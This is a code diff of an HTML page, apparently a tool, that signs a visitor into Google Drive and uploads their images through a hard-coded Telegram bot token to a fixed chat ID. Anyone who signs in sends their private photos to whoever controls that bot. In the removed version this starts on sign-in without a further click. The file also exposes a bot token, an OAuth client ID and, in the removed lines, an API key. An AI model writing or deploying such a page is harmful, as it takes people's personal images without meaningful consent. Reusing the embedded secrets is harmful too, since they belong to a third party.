@@ -1,146 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <title>Send Google Drive Images to Telegram Bot</title>
+  <meta charset="UTF-8" />
+  <title>ارسال صور Google Drive إلى Telegram</title>
   <script src="https://apis.google.com/js/api.js"></script>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    button { margin: 5px; padding: 10px 15px; font-size: 16px; }
+    pre { background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; }
+  </style>
 </head>
 <body>
-  <h2>Send all images from Google Drive to Telegram Bot</h2>
-  <button id="authorize_button" style="display:none;">Sign in with Google</button>
-  <button id="signout_button" style="display:none;">Sign Out</button>
+  <h2>ارسال صور Google Drive إلى Telegram</h2>
+
+  <button id="authorize_button">تسجيل الدخول إلى Google</button>
+  <button id="signout_button" style="display:none;">تسجيل الخروج</button>
+  <button id="send_photos" style="display:none;">ارسال الصور الى Telegram</button>
+
   <pre id="output"></pre>
 
-  <script>
-    const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
-    const API_KEY = 'AIzaSyCFdP_3PB4HPXix5SuPCe803Q0T0mBS5H0';
-    const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
+<script>
+  const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
+  const API_KEY = '';  // مش ضروري
+  const DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"];
+  const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
 
-    const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
-    const TELEGRAM_CHAT_ID = '6894787120';
+  // بيانات بوت التلجرام
+  const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
+  const TELEGRAM_CHAT_ID = '6894787120';
 
-    let tokenClient;
-    let gapiInited = false;
-    let gisInited = false;
+  const authorizeButton = document.getElementById('authorize_button');
+  const signoutButton = document.getElementById('signout_button');
+  const sendPhotosButton = document.getElementById('send_photos');
+  const output = document.getElementById('output');
 
-    function gapiLoaded() {
-      gapi.load('client', initializeGapiClient);
+  function appendOutput(message) {
+    output.textContent += message + '\n';
+  }
+
+  function handleClientLoad() {
+    gapi.load('client:auth2', initClient);
+  }
+
+  function initClient() {
+    gapi.client.init({
+      apiKey: API_KEY,
+      clientId: CLIENT_ID,
+      discoveryDocs: DISCOVERY_DOCS,
+      scope: SCOPES
+    }).then(() => {
+      // Listen for sign-in state changes.
+      gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
+      // Handle the initial sign-in state.
+      updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
+      authorizeButton.onclick = handleAuthClick;
+      signoutButton.onclick = handleSignoutClick;
+      sendPhotosButton.onclick = sendPhotosToTelegram;
+    }, error => {
+      appendOutput('خطأ في التهيئة: ' + JSON.stringify(error, null, 2));
+    });
+  }
+
+  function updateSigninStatus(isSignedIn) {
+    if (isSignedIn) {
+      authorizeButton.style.display = 'none';
+      signoutButton.style.display = 'inline-block';
+      sendPhotosButton.style.display = 'inline-block';
+      appendOutput('تم تسجيل الدخول بنجاح.');
+    } else {
+      authorizeButton.style.display = 'inline-block';
+      signoutButton.style.display = 'none';
+      sendPhotosButton.style.display = 'none';
+      appendOutput('يرجى تسجيل الدخول أولاً.');
     }
+  }
 
-    async function initializeGapiClient() {
-      await gapi.client.init({
-        apiKey: API_KEY,
-        discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
-      });
-      gapiInited = true;
-      maybeEnableButtons();
-    }
+  function handleAuthClick() {
+    gapi.auth2.getAuthInstance().signIn();
+  }
 
-    function gisLoaded() {
-      tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
-        scope: SCOPES,
-        callback: async (resp) => {
-          if (resp.error !== undefined) throw resp;
-          document.getElementById('signout_button').style.display = 'block';
-          document.getElementById('authorize_button').style.display = 'none';
-          await listImagesAndSend();
-        },
-      });
-      gisInited = true;
-      maybeEnableButtons();
-    }
+  function handleSignoutClick() {
+    gapi.auth2.getAuthInstance().signOut();
+    output.textContent = '';
+  }
 
-    function maybeEnableButtons() {
-      if (gapiInited && gisInited) {
-        document.getElementById('authorize_button').style.display = 'block';
-      }
-    }
-
-    function handleAuthClick() {
-      if (gapi.client.getToken() === null) {
-        tokenClient.requestAccessToken({prompt: 'consent'});
+  // جلب قائمة الصور من Google Drive (نوع mime = image)
+  function listImages() {
+    return gapi.client.drive.files.list({
+      'pageSize': 10, // عدد الصور المراد جلبها، يمكنك زيادة الرقم
+      'fields': "files(id, name, mimeType)",
+      'q': "mimeType contains 'image/' and trashed = false"
+    }).then(response => {
+      const files = response.result.files;
+      if (!files || files.length === 0) {
+        appendOutput('لم يتم العثور على صور في Google Drive.');
+        return [];
       } else {
-        tokenClient.requestAccessToken({prompt: ''});
+        appendOutput('تم العثور على ' + files.length + ' صورة.');
+        return files;
       }
-    }
+    }, error => {
+      appendOutput('خطأ في جلب الصور: ' + error.result.error.message);
+      return [];
+    });
+  }
 
-    function handleSignoutClick() {
-      const token = gapi.client.getToken();
-      if (token !== null) {
-        google.accounts.oauth2.revoke(token.access_token);
-        gapi.client.setToken('');
-        document.getElementById('output').textContent = 'Signed out.';
-        document.getElementById('authorize_button').style.display = 'block';
-        document.getElementById('signout_button').style.display = 'none';
-      }
-    }
+  // الحصول على رابط تحميل مباشر للصورة (مؤقت)
+  function getImageDownloadUrl(fileId) {
+    return `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;
+  }
 
-    async function listImagesAndSend() {
-      let files = [];
-      let pageToken = null;
+  // إرسال صورة إلى Telegram عن طريق بوت
+  async function sendPhotoToTelegram(fileName, fileUrl) {
+    appendOutput(`جاري إرسال الصورة: ${fileName}`);
 
-      do {
-        let response = await gapi.client.drive.files.list({
-          q: "mimeType contains 'image/'",
-          fields: 'nextPageToken, files(id, name)',
-          spaces: 'drive',
-          pageToken: pageToken,
-        });
-        files = files.concat(response.result.files);
-        pageToken = response.result.nextPageToken;
-      } while (pageToken);
-
-      document.getElementById('output').textContent = `Found ${files.length} image(s).\nSending to Telegram...\n`;
-
-      for (let file of files) {
-        document.getElementById('output').textContent += `Sending: ${file.name}\n`;
-        await sendImageToTelegram(file.id, file.name);
-      }
-
-      document.getElementById('output').textContent += '✅ All images sent!';
-    }
-
-    async function sendImageToTelegram(fileId, fileName) {
-      try {
-        const accessToken = gapi.client.getToken().access_token;
-        const fileUrl = `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;
-
-        const response = await fetch(fileUrl, {
-          headers: { Authorization: `Bearer ${accessToken}` }
-        });
-
-        if (!response.ok) throw new Error('Failed to fetch image');
-
-        const blob = await response.blob();
-
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, fileName);
-        formData.append('caption', fileName);
-
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-
-        const telegramResponse = await fetch(telegramUrl, {
-          method: 'POST',
-          body: formData,
-        });
-
-        if (!telegramResponse.ok) {
-          const errorText = await telegramResponse.text();
-          throw new Error(`Telegram API error: ${errorText}`);
+    // تحميل الصورة كـ Blob من Google Drive
+    try {
+      const token = gapi.auth.getToken().access_token;
+      const response = await fetch(fileUrl, {
+        headers: {
+          'Authorization': 'Bearer ' + token
         }
-      } catch (err) {
-        document.getElementById('output').textContent += `❌ Error sending ${fileName}: ${err.message}\n`;
+      });
+      const blob = await response.blob();
+
+      // إرسال الصورة إلى Telegram باستخدام form-data
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('caption', `الصورة من Google Drive: ${fileName}`);
+      formData.append('photo', blob, fileName);
+
+      const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      const telegramResult = await telegramResponse.json();
+      if (telegramResult.ok) {
+        appendOutput(`تم إرسال الصورة: ${fileName}`);
+      } else {
+        appendOutput(`خطأ في إرسال الصورة: ${fileName} - ${telegramResult.description}`);
       }
+    } catch (error) {
+      appendOutput(`خطأ عام في إرسال الصورة: ${fileName} - ${error.message}`);
+    }
+  }
+
+  // دالة ترسل كل الصور الموجودة إلى Telegram
+  async function sendPhotosToTelegram() {
+    appendOutput('جاري جلب الصور...');
+    const files = await listImages();
+    if (files.length === 0) {
+      appendOutput('لا توجد صور للإرسال.');
+      return;
     }
 
-    window.onload = function() {
-      gapiLoaded();
-      gisLoaded();
-      document.getElementById('authorize_button').onclick = handleAuthClick;
-      document.getElementById('signout_button').onclick = handleSignoutClick;
-    };
-  </script>
+    for (const file of files) {
+      const downloadUrl = getImageDownloadUrl(file.id);
+      await sendPhotoToTelegram(file.name, downloadUrl);
+    }
+    appendOutput('تم إرسال كل الصور.');
+  }
+
+  // بدء تحميل مكتبة Google API عند تحميل الصفحة
+  handleClientLoad();
+</script>
 </body>
 </html>
